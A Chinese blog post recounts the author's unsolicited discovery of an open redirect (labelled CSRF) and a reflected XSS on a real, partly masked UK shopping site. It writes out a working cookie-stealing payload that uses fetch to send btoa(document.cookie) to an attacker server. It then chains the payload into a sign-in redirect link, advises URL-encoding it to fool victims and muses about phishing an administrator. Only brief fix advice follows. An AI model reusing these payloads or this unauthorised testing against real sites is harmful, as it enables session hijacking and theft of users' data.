
# （真实世界）我的第一次真实对国外某购物平台web漏洞挖掘

- CSRF - 低危
- XSS - 低危

这两组合起来就完全不一样一点的，个人觉得比原本高一些

**危害：窃取用户敏感数据、用户cookie、钓鱼操作 等...**

## 前言

**这是我第一次，真实世界的web漏洞挖掘（csrf + xss）**

**虽然这两个漏洞都比较简单，但这是我第一次的真实漏洞挖掘，当然要记录一下，哪怕再简单**  
**虽然这两个漏洞都比较简单，但这是我第一次的真实漏洞挖掘，当然要记录一下，哪怕再简单**  
**虽然这两个漏洞都比较简单，但这是我第一次的真实漏洞挖掘，当然要记录一下，哪怕再简单**

**这次漏洞挖掘是无意的，这是我在做题的时候，题目需要我进行信息收集，我收集到相关的一个网站，于是在这个网站多看了几眼，发现了漏洞**

---

首先我打开这个网站的第一件事，也是最简单的：**查看源代码**

![在这里插入图片描述](https://img-blog.csdnimg.cn/2a17b468756548dca95cafe65ce2e7ae.png)

源代码：

![在这里插入图片描述](https://img-blog.csdnimg.cn/c2062d341aed4dc98c07d902fa12bf92.png)

在源代码中发现这一个url

---

## url参数重定向 - CSRF

分析：

	/sign-in?redirect=

这里我测试过，因为这里是用户登录页面

- 如果用户未登录，则在用户登录成功后，重定向到redirect参数指定的url
- 如果用户已登录，则直接跳转到redirect参数指定的url

当我尝试修改redirect参数，改成百度：

![在这里插入图片描述](https://img-blog.csdnimg.cn/1f89210d99db4545814f1c851143d2cf.png)

在已登录状态下，确实重定向到百度去了

---

## csrf的好兄弟

我们都知道，单单一个csrf通常情况下危害不大，甚至可以忽略不计，没啥用

但是csrf可以搭配其他漏洞来做一套组合拳，这个漏洞就是xss.

通过csrf漏洞将受害者重定向到被攻击者控制的具有xss漏洞的页面上，执行恶意js代码

通过这套csrf + xss

攻击者很容易获得一些信息，如：

- 用户的cookie
- 攻击者期望的操作，例如：下单、修改账户等相关操作
- 社会工程 - 攻击者利用xss构建恶意代码，攻击者诱导受害者填写隐私信息以获取攻击者想要获取的受害者的信息

等等等等

---

**所以现在我们的当务之急应该寻找xss漏洞，打一套组合拳**

## XSS - 反射型

果不其然，经过tryhackme的训练，我一下子就找到了

就在网站主页的**搜索功能**！

一开始尝试sql注入，但是无果

但是第二次尝试寻找漏洞的时候，我发现输入的内容会拼接到回显页面中，于是开始尝试xss


![在这里插入图片描述](https://img-blog.csdnimg.cn/e93219f81ba84342805ec3f434356d0a.png)

它直接镶嵌到span标签中

我直接绕出去了，毫无难度，成功找到反射xss漏洞

---

## XSS + CSRF - 组合拳

**兔年万事如意，心想事成**

现在我们可以尝试简单的利用xss+csrf获取用户的cookie

构造XSS Payload:

	https://www.nonono.co.uk/search?nonono='<script>fetch('//<攻击者http服务器>/?cookie='+btoa(document.cookie));</script>

**注意：这里的fetch函数中的url不能携带有http://或https://，否则会失败，所以使用//**

**最好不要有空格，因为此payload稍后将会放到url参数中**

****

我们可以直接验证此payload是否有效:

![在这里插入图片描述](https://img-blog.csdnimg.cn/d0e27c9dd0364534a6fa86a1b05174c6.png)

可以看到它携带着cookie去请求攻击者托管的http服务器去了！

![在这里插入图片描述](https://img-blog.csdnimg.cn/ed9395ed2e31404fa59b6b51898535d5.png)


现在让我们将xss和csrf组合起来：

实现**让用户点击我们的精心设计过的登录url，即可窃取该用户的cookie等**

### **如果通过钓鱼等方式令网站管理员点击此恶意链接会发生什么事？**

我很难想象，毕竟这个平台有些地方甚至没有csrf防护，也别忘了我们还有xss

### 回归正题

首先，随便注册个账户并登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/cc48a844fbd3461fa8d30d5f725f0576.png)

XSS Payload:

	https://www.nonono.co.uk/search?nonono='<script>fetch('//<攻击者http服务器>/?cookie='+btoa(document.cookie));</script>

CSRF Payload:

	https://www.nonno.co.uk/sign-in?redirect=https://www.nonono.co.uk/search?nonono='<script>fetch('//<攻击者http服务器>/?cookie='+btoa(document.cookie));</script>

解析：当已登录用户点击此csrf payload的url，将重定向到xss漏洞处并执行我们指定的恶意js代码，这里的js代码使用fetch发送请求到我们攻击者的http服务器并附带cookie

![在这里插入图片描述](https://img-blog.csdnimg.cn/ed9395ed2e31404fa59b6b51898535d5.png)

**至此漏洞利用完成，攻击者将获取受害者的cookie，甚至其他任何操作！**

**只要适当的将payload进行urlencode，受害者可能根本无法判断！**

---

## 漏洞修补建议

### CSRF

- 不要使用url参数(GET or POST)来进行重定向
- 完善各个功能的csrf防护

### XSS

- 做好用户输入检测，检测到黑名单字符直接禁止访问
- 过滤特殊字符

---

## 结束

事实上我这里只找了一个xss和一个csrf漏洞，很难猜测其他地方是否还存在其他漏洞。

希望平台管理方认真做好安全防护

这也是我的第一次真实的web漏洞挖掘，我非常的激动，这是一次无意的漏洞挖掘，真的是无意的

---

不说了，跑路了


